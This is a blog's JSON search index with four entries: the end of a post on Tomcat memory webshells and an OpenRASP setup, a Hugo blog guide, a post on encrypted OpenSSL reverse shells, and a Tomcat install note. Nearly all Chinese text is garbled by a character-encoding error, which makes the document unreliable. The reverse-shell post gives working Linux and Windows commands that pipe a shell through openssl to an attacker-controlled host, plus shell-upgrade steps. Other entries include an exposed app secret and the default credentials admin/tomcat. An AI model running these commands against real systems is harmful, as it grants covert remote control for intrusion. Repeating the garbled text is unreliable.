code by c0ny1 \u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   å†…å­˜é©¬æ’æŸ¥ å¦‚æœæ˜¯jspæ³¨å…¥ï¼Œæ—¥å¿—ä¸­æ’æŸ¥å¯ç–‘jspçš„è®¿é—®è¯·æ±‚\næ ¹æ®ä¸šåŠ¡ä½¿ç”¨çš„ç»„ä»¶æ’æŸ¥æ˜¯å¦å¯èƒ½å­˜åœ¨javaä»£ç æ‰§è¡Œæ¼æ´ä»¥åŠæ˜¯å¦å­˜åœ¨è¿‡webshellï¼Œæ’æŸ¥æ¡†æ¶æ¼æ´ï¼Œååºåˆ—åŒ–æ¼æ´ã€‚\nå¦‚æœæ˜¯ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ’æŸ¥ä¸­é—´ä»¶çš„error.logï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘çš„æŠ¥é”™ï¼Œåˆ¤æ–­æ³¨å…¥æ—¶é—´å’Œæ–¹æ³•\nå¦‚æœæ˜¯servletæˆ–è€…springçš„controllerç±»å‹ï¼Œæ ¹æ®ä¸ŠæŠ¥çš„webshellçš„urlæŸ¥æ‰¾æ—¥å¿—ï¼ˆæ—¥å¿—å¯èƒ½è¢«å…³é—­ï¼Œä¸ä¸€å®šæœ‰ï¼‰ï¼Œæ ¹æ®urlæœ€æ—©è®¿é—®æ—¶é—´ç¡®å®šè¢«æ³¨å…¥æ—¶é—´ã€‚\nå¦‚æœæ˜¯filteræˆ–è€…listenerç±»å‹ï¼Œå¯èƒ½ä¼šæœ‰è¾ƒå¤šçš„404ä½†æ˜¯å¸¦æœ‰å‚æ•°çš„è¯·æ±‚ï¼Œæˆ–è€…å¤§é‡è¯·æ±‚ä¸åŒurlä½†å¸¦æœ‰ç›¸åŒçš„å‚æ•°ï¼Œæˆ–è€…é¡µé¢å¹¶ä¸å­˜åœ¨ä½†è¿”å›200\næ•´ä½“æ¼”ç¤º \u0026ldquo;http://{ip}:{port}/{waråŒ…åç§°}/{è®¿é—®çš„é»˜è®¤é¦–é¡µ}\u0026rdquo;\næ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n  --- DON'T MODIFY THIS LINE --- åˆ›å»ºJavaWebé¡¹ç›®  IDEAä»¥Moduleæ–¹å¼åˆ›å»ºIDEAé¡¹ç›®JSPé¡¹ç›®\n  æ–°å»ºservletshell.jsp è§£å†³æŠ¥é”™ java-memshell-scanner åˆ›å»ºmemshell-scanner.jsp\næ¼”ç¤º æ‰“åŒ…éƒ¨ç½²åˆ°Tomcat Centoså®‰è£…Tomcat 1 2  yum -y install tomcat systemctl start/stop/status tomcat    å®‰è£…è·¯å¾„ï¼š /usr/share/tomcat é…ç½®è·¯å¾„:ï¼š/etc/tomcat/ æ’é”™æ—¥å¿—ï¼š /usr/share/tomcat/logs/catalina.*.log  éƒ¨ç½²waråŒ… ä¸Šä¼ waråŒ…åˆ°/usr/share/tomcat/webapps\n1  scp TomcatServletShell-1.0-SNAPSHOT.war rasp:/usr/share/tomcat/webapps   é…ç½®openrasp  ä¸‹è½½Java Agentå®‰è£…åŒ…  1 2 3  curl https://packages.baidu.com/app/openrasp/release/1.3.7/rasp-java.tar.gz -o rasp-java.tar.gz tar -xvf rasp-java.tar.gz cd rasp-*/   æ‰§è¡ŒRaspInstallè¿›è¡Œå®‰è£…\nè¯·å…ˆæ›¿æ¢ /path/to/tomcat ä¸ºä½ çš„æœåŠ¡å™¨è·¯å¾„ï¼Œå†æ‰§è¡Œå‘½ä»¤å®‰è£…  1  java -jar RaspInstall.jar -heartbeat 90 -appid 6e009cc2caf116635581b17a7872a88940ed2b70 -appsecret qLAra0wyLZGabX9KrBry7bR0goHiStXTz910Q5vbNoa -backendurl http://127.0.0.1:8086/ -install /usr/share/tomcat/   é‡å¯ Tomcat/JBoss/WebLogic/SpringBoot åº”ç”¨æœåŠ¡å™¨  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  systemctl restart tomcat systemctl status tomcat â— tomcat.service - Apache Tomcat Web Application Container Loaded: loaded (/usr/lib/systemd/system/tomcat.service; disabled; vendor preset: disabled) Active: active (running) since Wed 2022-07-20 10:43:42 UTC; 40s ago Main PID: 16583 (java) Tasks: 42 Memory: 109.8M CGroup: /system.slice/tomcat.service â””â”€16583 /usr/lib/jvm/jre/bin/java -javaagent:/usr/share/tomcat/rasp/rasp.jar -javaagent:/usr/share/tomcat/rasp/rasp.jar -classpath /usr/share/tomcat/bin/bootstrap.jar:/us... Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: Jul 20, 2022 10:43:43 AM org.apache.catalina.core.StandardService startInternal Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: INFO: Starting service Catalina Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: Jul 20, 2022 10:43:43 AM org.apache.catalina.core.StandardEngine startInternal Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: INFO: Starting Servlet Engine: Apache Tomcat/7.0.76 Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: Jul 20, 2022 10:43:43 AM org.apache.coyote.AbstractProtocol start Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: INFO: Starting ProtocolHandler [\u0026#34;http-bio-8080\u0026#34;] Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: Jul 20, 2022 10:43:43 AM org.apache.coyote.AbstractProtocol start Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: INFO: Starting ProtocolHandler [\u0026#34;ajp-bio-8009\u0026#34;] Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: Jul 20, 2022 10:43:43 AM org.apache.catalina.startup.Catalina start Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: INFO: Server startup in 41 ms   æ’é”™\næŸ¥çœ‹ /usr/share/tomcat/logs/catalina.2022-07-20.logå‘ç°å¦‚ä¸‹é”™è¯¯ï¼š  java.lang.UnsatisfiedLinkError: /var/cache/tomcat/temp/nativelib-loader_4485267645656510327/Classloader.1658314629304.0/libopenrasp_v8_java.so: /var/cache/tomcat/temp/nativelib-loader_4485267645656510327/Classloader.1658314629304.0/libopenrasp_v8_java.so: failed to map segment from shared object: Permission denied\né—®äº†@c0de::bre@k å¤§ä½¬ï¼Œæ˜¯å¼€å¯SElinuxçš„åŸå› \n1  /usr/sbin/sestatus -v # æŸ¥çœ‹selinuxçŠ¶æ€   æ¥ä¸‹æ¥éœ€è¦å…³é—­SELinuxå†…æ ¸ï¼Œæ‰“å¼€selinuxé…ç½®æ–‡ä»¶ï¼Œ\ncd /etc/selinux/config\næ‰“å¼€configé…ç½®æ–‡ä»¶ä»¥åï¼Œæ‰¾åˆ°SELINUX=enforcingï¼Œå°†å…¶æ”¹ä¸ºSELINUX=disabled , é‡å¯\nå‚è€ƒ Javaå†…å­˜é©¬ï¼šä¸€ç§Tomcatå…¨ç‰ˆæœ¬è·å–StandardContextçš„æ–°æ–¹æ³•\nä¸€æ–‡çœ‹æ‡‚å†…å­˜é©¬\n ","description":"å…ˆæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ¶æ„çš„servletï¼Œç„¶åè·å–å½“å‰çš„StandardContextï¼Œç„¶åå°†æ¶æ„servletå°è£…æˆwrapperæ·»åŠ åˆ°StandardContextçš„childrenå½“ä¸­ï¼Œæœ€åæ·»åŠ ServletMappingå°†è®¿é—®çš„URLå’Œwrapperè¿›è¡Œç»‘å®šã€‚","id":31,"section":"dso","tags":null,"title":"Tomcatçš„servletAPIå‹å†…å­˜é©¬ç ”ç©¶","uri":"http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88/"},{"content":"Beijing: â˜€ï¸ ğŸŒ¡ï¸+31Â°C ğŸŒ¬ï¸â†‘11km/h\n [[https://imcaviare.com/post/auto-deploy-hugo/][hugoè‡ªåŠ¨åŒ–æ­å»ºåšå®¢ä¹‹ä¸€]] [[https://cloud.tencent.com/developer/article/1647964?from=article.detail.1970808][hugoè‡ªåŠ¨åŒ–æ­å»ºåšå®¢ä¹‹äºŒ]] [[https://www.jianshu.com/p/7c3f31d44b1d][hugoè‡ªåŠ¨åŒ–æ­å»ºåšå®¢ä¹‹ä¸‰]]  Hugoæ˜¯ç”±Goè¯­è¨€å®ç°çš„é™æ€ç½‘ç«™ç”Ÿæˆå™¨ã€‚ç®€å•ã€æ˜“ç”¨ã€é«˜æ•ˆã€æ˜“æ‰©å±•ã€å¿«é€Ÿéƒ¨ç½²ã€‚\n1  brew install hugo   å¸¸è§hugoåˆ›å»ºåšå®¢æ­¥éª¤ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  hugo new site myBlog -f toml \u0026amp;\u0026amp; cd myBlog git init git submodule add https://github.com/zzossig/hugo-theme-zdoc.git themes/zdoc git submodule update --init --recursive #è‹¥å…‹éš†ä»–äººåšå®¢ï¼Œéœ€æ‰§è¡Œ åˆå§‹åŒ–å’ŒåŒæ­¥ä¸»é¢˜ä¿®æ”¹ git submodule update --remote # åŒæ­¥ä¸»é¢˜ä¿®æ”¹ cp -rf themes/zdoc/exampleSite/* ./ cp -rf themes/zdoc/archetypes ./ # å‘å¸ƒæ–°æ–‡ç«  hugo new posts/blog-test.md # æœ¬åœ°è°ƒè¯• hugo server -D # enable Draft git add * git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin git@github.com:\u0026lt;user\u0026gt;/Repo.git git push -u origin main   å…³äºOBsidiançš„ä½¿ç”¨ Obsidianæ˜¯åŸºäºæœ¬åœ°makrdownæ–‡ä»¶çš„ä¸€ä¸ªå¼ºå¤§çš„çŸ¥è¯†åº“\nç‰¹ç‚¹åŠŸèƒ½: é“¾æ¥åŠŸèƒ½ã€è„‘å›¾\nono-sendai-themes\n","description":"","id":32,"section":"blog","tags":["hugo","obsidian","githubActions"],"title":"ä¸ªäººçŸ¥è¯†åº“ä»‹ç»(Obsidian+hugo)","uri":"http://crkmythical.github.io/blog/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93%E5%8F%8A%E5%8D%9A%E5%AE%A2%E4%BB%8B%E7%BB%8Dobsidian+hugo+githubactions/"},{"content":"Beijing: â˜€ï¸ ğŸŒ¡ï¸+31Â°C ğŸŒ¬ï¸â†‘15km/h\nåŠ å¯†åå¼¹Openssl_ReverseShell Linuxç¯å¢ƒ server 1 2 3  openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes openssl s_server -quiet -key key.pem -cert cert.pem -port 7777    req åˆ›å»ºå’Œå¤„ç†è¯ä¹¦ -x509 ä¸“ç”¨äºç”ŸæˆCAè¯ä¹¦ -newkey rsa:2048 åˆ›å»ºä¸€ä¸ªä½¿ç”¨RSAç®—æ³•ç”Ÿæˆ2048ä½çš„è¯ä¹¦å’Œç§é’¥ -keyout key.pem ç§é’¥ä¿å­˜ä½ç½® -out cert.pem è¯ä¹¦ä¿å­˜ä½ç½® -days 365 æŒ‡å®šè¯ä¹¦çš„æœ‰æ•ˆæœŸé™,å•ä½ä¸ºdayï¼Œé»˜è®¤365å¤© -nodes : ä¸åŠ å¯†ç§é’¥  ä½¿ç”¨python ptyæ¨¡å—å°†ä¸å®Œå…¨shellå˜ä¸ºå®Œå…¨shell 1  python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;   é”®å…¥ Ctrl-Zï¼Œå›åˆ° VPS çš„å‘½ä»¤è¡Œä¸­ï¼Œå†è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š 1 2  stty raw -echo fg   å›åˆ°ä¸å®Œå…¨shell ä¸­ï¼›åœ¨ä¸å®Œå…¨ shell ä¸­é”®å…¥ Ctrl-lï¼Œæ‰§è¡Œï¼š 1 2 3 4  reset export SHELL=bash export TERM=xterm-256color stty rows 54 columns 104   æ­¤æ—¶å·²ç»å˜æˆäº†åŠŸèƒ½é½å…¨çš„äº¤äº’å¼ shellï¼Œæ¯”å¦‚æ”¯æŒå‘½ä»¤è¡¥å…¨ã€è¯­æ³•é«˜äº®ç­‰ã€‚\nclient 1  mkfifo /tmp/s; /bin/sh -i \u0026lt; /tmp/s 2\u0026gt;\u0026amp;1 | openssl s_client -quiet -connect 192.168.xx.xx:7777 \u0026gt; /tmp/s; rm /tmp/s    mkfifo /tmp/s åˆ›å»ºç®¡é“ /bin/sh -i \u0026lt; /tmp/s 2\u0026gt;\u0026amp;1 æ‰“å¼€äº¤äº’å¼shellï¼Œ2\u0026gt;\u0026amp;1çš„æ„æ€æ˜¯æŠŠæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œå¦åˆ™è¾“å…¥é”™è¯¯å‘½ä»¤å›æ˜¾ä¼šæ˜¾ç¤ºåœ¨é¶æœºä¸­ openssl s_client -quiet -connect 192.168.xx.xx:7777 \u0026gt; /tmp/s è§£å¯†æµé‡ï¼Œå°†æ”»å‡»ç«¯è¾“å…¥çš„æ•°æ®è§£å¯†ååå¼¹å›æ”»å‡»ç«¯ -quiet ä¸æ‰“å°å‡ºsessionå’Œè¯ä¹¦çš„ä¿¡æ¯ã€‚åŒæ—¶éšå¼æ‰“å¼€-ign_eof -ign_eof å½“è¾“å…¥æ–‡ä»¶åˆ°è¾¾æ–‡ä»¶å°¾çš„æ—¶å€™å¹¶ä¸æ–­å¼€è¿æ¥ -connect host:port è®¾ç½®æœåŠ¡å™¨åœ°å€å’Œç«¯å£å·ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®ï¼Œåˆ™é»˜è®¤ä¸ºæœ¬åœ°ä¸»æœºä»¥åŠç«¯å£å·4433 rm /tmp/s ç”±äºå·²ç»åŠ è½½è¿›å†…å­˜ï¼Œæ¸…é™¤æ‰/tmp/sæ–‡ä»¶  Windowsç¯å¢ƒ Server æœåŠ¡ç«¯å¼€å¯ä¸¤ä¸ªç›‘å¬ï¼Œä» ip:port1 è·å–å‘½ä»¤å‘é€ç»™ cmd.exeæ‰§è¡Œï¼Œç„¶åç»“æœè¿”å›åˆ° ip:port2ã€‚\n1 2  openssl s_server -quiet -key key.pem -cert cert.pem -port 443 openssl s_server -quiet -key key.pem -cert cert.pem -port 445   client 1 2  openssl s_client -quiet -connect 1.1.1.1:443 | cmd.exe | openssl s_client -quiet -connect 1.1.1.1:445   æ“ä½œæ¼”ç¤º æ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n  --- DON'T MODIFY THIS LINE ---  ","description":"","id":33,"section":"blog","tags":["",""],"title":"åŠ å¯†åå¼¹Openssl_ReverseShell","uri":"http://crkmythical.github.io/blog/%E5%8A%A0%E5%AF%86%E5%8F%8D%E5%BC%B9openssl_reverseshell/"},{"content":"Beijing: â˜€ï¸ ğŸŒ¡ï¸+35Â°C ğŸŒ¬ï¸â†˜4km/h\nå®‰è£…Tomcat-macOSç‰ˆ Homebrewå®‰è£… 1 2  brew install tomcat@9 /opt/homebrew/opt/tomcat@9/bin/catalina run    Configuration files: /opt/homebrew/etc/tomcat@9 echo 'export PATH=\u0026quot;/opt/homebrew/opt/tomcat@9/bin:$PATH\u0026quot;' \u0026gt;\u0026gt; ~/.zshrc If you need to have tomcat@9 first in your PATH brew services restart tomcat@9 To restart tomcat@9 after an upgrade in Background /opt/homebrew/opt/tomcat@9/bin/catalina run if you don\u0026rsquo;t want/need a background service  é…ç½®tomcatåº”ç”¨ç®¡ç†GUIç”¨æˆ· ä¿®æ”¹ /opt/homebrew/etc/tomcat/tomcat-users.xml\n1 2  \u0026lt;role rolename=\u0026#34;manager-gui\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;admin\u0026#34; password=\u0026#34;tomcat\u0026#34; roles=\u0026#34;manager-gui\u0026#34;/\u0026gt;   é…ç½®æœåŠ¡å™¨ç«¯å£ ä¿®æ”¹ /opt/homebrew/etc/tomcat@9/server.xml æ–‡ä»¶\n1 2 3 4  \u0026lt;Connector port=\u0026#34;8080\u0026#34; protocol=\u0026#34;HTTP/1.1\u0026#34; connectionTimeout=\u0026#34;20000\u0026#34; redirectPort=\u0026#34;8443\u0026#34; /\u0026gt;   ","description":"","id":34,"section":"dso","tags":["",""],"title":"å®‰è£…Tomcat-macOSç‰ˆ","uri":"http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%89%E8%A3%85tomcat-macos%E7%89%88/"}]